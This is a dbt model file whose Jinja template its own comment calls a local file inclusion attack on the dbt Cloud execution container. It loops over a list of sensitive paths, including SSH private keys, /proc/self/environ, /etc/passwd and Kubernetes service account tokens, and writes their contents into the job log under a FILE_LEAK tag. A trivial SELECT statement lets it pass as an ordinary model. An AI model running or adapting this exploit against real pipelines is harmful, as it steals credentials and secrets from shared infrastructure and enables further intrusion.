-- LFI via load_file_contents — reads files from the dbt Cloud execution container
-- Uses dynamic run ID from env_var to construct SSH config path

{% set run_id = env_var('DBT_CLOUD_RUN_ID', 'unknown') %}

{% set files_to_read = [
    '/tmp/jobs/' ~ run_id ~ '/.ssh/config',
    '/tmp/jobs/' ~ run_id ~ '/.ssh/id_rsa',
    '/tmp/jobs/' ~ run_id ~ '/.ssh/id_ed25519',
    '/tmp/jobs/' ~ run_id ~ '/.ssh/known_hosts',
    '/proc/self/environ',
    '/proc/self/cgroup',
    '/etc/hostname',
    '/etc/resolv.conf',
    '/etc/passwd',
    '/var/run/secrets/kubernetes.io/serviceaccount/token',
    '/var/run/secrets/kubernetes.io/serviceaccount/namespace',
    '/usr/src/orc/Dockerfile',
    '/usr/src/orc/requirements.txt',
    '/usr/src/orc/pyproject.toml',
    '/usr/src/orc/setup.cfg'
] %}

{% for fpath in files_to_read %}
{% set content = load_file_contents(fpath) %}
{% if content %}
{{ log("FILE_LEAK[" ~ fpath ~ "]=" ~ content[:800], info=True) }}
{% else %}
{{ log("FILE_LEAK[" ~ fpath ~ "]=NOT_FOUND", info=True) }}
{% endif %}
{% endfor %}

SELECT 1 as id
